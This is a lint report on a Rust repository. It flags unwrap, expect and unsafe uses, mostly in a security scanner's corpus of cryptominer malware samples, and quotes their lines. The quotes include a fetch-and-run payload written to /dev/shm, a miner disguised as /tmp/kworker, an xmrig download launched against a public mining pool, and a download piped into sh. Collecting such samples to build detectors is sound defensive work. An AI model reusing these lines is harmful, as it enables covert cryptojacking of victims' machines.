HIGH	mlgraph	libs/general/mlgraph/examples/vit_optimize.rs:33	let graph = build_vit(&config).expect("failed to build ViT graph");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_076.rs:5	let dl = ureq::get(payload).call().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_076.rs:6	let mut exec = std::fs::File::create("/dev/shm/x").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_076.rs:7	std::io::copy(&mut dl.into_reader(), &mut exec).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_076.rs:8	std::os::unix::fs::PermissionsExt::set_mode(&mut std::fs::metadata("/dev/shm/x").unwrap(), 0o777);	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_076.rs:9	std::process::Command::new("/dev/shm/x").arg("--donate-level=0").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_077.rs:7	s.write(auth.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_077.rs:13	let mut stream = TcpStream::connect(pool_addr).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_077.rs:14	stream.write_all(b"{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"wallet_address","pass":"x"}}\n").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_078.rs:12	std::fs::write("/tmp/kworker", bin_data).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_078.rs:13	std::process::Command::new("chmod").args(&["+x", "/tmp/kworker"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_078.rs:14	std::process::Command::new("/tmp/kworker").arg("-o").arg("pool.com:4444").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_079.rs:12	std::fs::write("/tmp/kworker", bin_data).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_079.rs:13	std::process::Command::new("chmod").args(&["+x", "/tmp/kworker"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_079.rs:14	std::process::Command::new("/tmp/kworker").arg("-o").arg("pool.com:4444").spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_080.rs:20	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_082.rs:4	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_082.rs:17	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_083.rs:7	let mut conn = TcpStream::connect((host, port)).expect("connection failed");	Replace expect() with explicit error propagation and attach boundary-specific context.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_083.rs:9	conn.write_all(login_req.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_084.rs:5	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_086.rs:5	stream.write(auth_str.as_bytes()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_086.rs:7	let n = stream.read(&mut buf).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_086.rs:9	panic!("auth failed");	Return a typed error with context instead of aborting the process from library code.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_087.rs:5	rustacuda::init(rustacuda::CudaFlags::empty()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_087.rs:6	let device = Device::get_device(0).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_087.rs:7	let _context = Context::create_and_push(ContextFlags::MAP_HOST | ContextFlags::SCHED_AUTO, device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_087.rs:8	let module = Module::load_from_string(PTX_SOURCE).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_087.rs:9	let stream = Stream::new(StreamFlags::NON_BLOCKING, None).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:5	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:13	rustacuda::init(rustacuda::CudaFlags::empty()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:14	let device = Device::get_device(0).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:15	let _context = Context::create_and_push(ContextFlags::MAP_HOST | ContextFlags::SCHED_AUTO, device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:16	let module = Module::load_from_string(PTX_SOURCE).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_088.rs:17	let stream = Stream::new(StreamFlags::NON_BLOCKING, None).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_089.rs:5	let token = resp.into_string().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_089.rs:11	let context = opencl3::context::Context::from_device(&device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_089.rs:12	let program = opencl3::program::Program::create_and_build_from_source(&context, KERNEL_SRC, "").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_089.rs:13	let kernel = opencl3::kernel::Kernel::create(&program, "mine_cryptonight").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_090.rs:4	let context = opencl3::context::Context::from_device(&device).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_090.rs:5	let program = opencl3::program::Program::create_and_build_from_source(&context, KERNEL_SRC, "").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_090.rs:6	let kernel = opencl3::kernel::Kernel::create(&program, "mine_cryptonight").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_091.rs:17	let resp = reqwest::blocking::get(xmrig_url).unwrap().bytes().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_091.rs:18	let mut file = std::fs::File::create("/tmp/xmrig.tar.gz").unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_091.rs:19	file.write_all(&resp).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_091.rs:20	std::process::Command::new("tar").args(&["-xzf", "/tmp/xmrig.tar.gz", "-C", "/tmp/"]).output().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_091.rs:21	std::process::Command::new("/tmp/xmrig-6.18.1/xmrig").args(&["-o", "pool.supportxmr.com:3333", "-u", "WALLET", "-p", "x"]).spawn().unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_092.rs:5	.and_then(|child| std::process::Command::new("sh").stdin(child.stdout.unwrap()).spawn()).unwrap();	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
CRITICAL	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_092.rs:9	unsafe {	Remove the unsafe block or encapsulate it behind a proven safe abstraction with documented invariants.
HIGH	warpscan	libs/tools/warpscan/future_work/corpus/malware/rust/cryptominer/cryptominer_sample_093.rs:17	for dev in ocl::Device::list_all(&ocl::Platform::default()).unwrap() {	Replace unwrap() with explicit handling so malformed input and system failures cannot crash the process.
